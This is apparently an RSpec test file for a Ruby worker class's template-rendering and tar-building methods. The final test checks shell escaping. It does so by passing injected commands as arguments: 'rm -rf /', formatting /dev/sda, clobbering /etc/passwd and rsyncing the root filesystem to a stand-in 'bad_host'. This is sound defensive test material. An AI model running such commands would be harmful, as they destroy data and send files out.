require 'spec_helper'

describe CloudModel::BaseWorker do
  let(:host) { Factory :host }
  subject { CloudModel::BaseWorker.new host }
  
  context 'render' do
    it 'should call render on a new instance of ActionView::Base and pass return value' do
      action_view = double(ActionView::Base)
      ActionView::Base.stub(:new).and_return action_view
      action_view.should_receive(:view_paths=).with ActionController::Base.view_paths
      action_view.should_receive(:render).with(template: 'my_template', locals: {a:1, b:2}).and_return 'rendered template'
      expect(subject.render 'my_template', a: 1, b: 2).to eq 'rendered template'
    end
  end
  
  context 'build_tar' do
    it 'should execute tar on host' do
      host.should_receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2 /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar '/mnt/root', '/inst/image.tar.bz2'
    end
    
    it 'should parse boolean parameter' do
      host.should_receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2 --option /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar '/mnt/root', '/inst/image.tar.bz2', option: true   
    end

    it 'should parse valued parameter' do
      host.should_receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2 --option test /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar '/mnt/root', '/inst/image.tar.bz2', option: 'test'   
    end
    
    it 'should parse multiplevalued parameter' do
      host.should_receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2 --option test --option test2 /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar '/mnt/root', '/inst/image.tar.bz2', option: ['test', 'test2']
    end
    
    it 'should only put one - in front of single character options' do
      host.should_receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2 -j -C test /mnt/root", "Failed to build tar /inst/image.tar.bz2").and_return 'ok'
      subject.build_tar '/mnt/root', '/inst/image.tar.bz2', j: true, C: 'test'
    end
    
    it 'should escape values' do
      host.should_receive(:exec!).with("/bin/tar czf /inst/image.tar.bz2\\;\\ mkfs.ext2\\ /dev/sda --option\\;\\ echo\\ /dev/random\\ /etc/passwd\\; test\\;\\ rsync\\ /\\ bad_host:/pirate\\; /mnt/root\\;\\ rm\\ -rf\\ /\\;", "Failed to build tar /inst/image.tar.bz2; mkfs.ext2 /dev/sda").and_return 'ok'
      subject.build_tar '/mnt/root; rm -rf /;', '/inst/image.tar.bz2; mkfs.ext2 /dev/sda', 'option; echo /dev/random /etc/passwd;' => 'test; rsync / bad_host:/pirate;'
    end
    
    
  end
  
  
end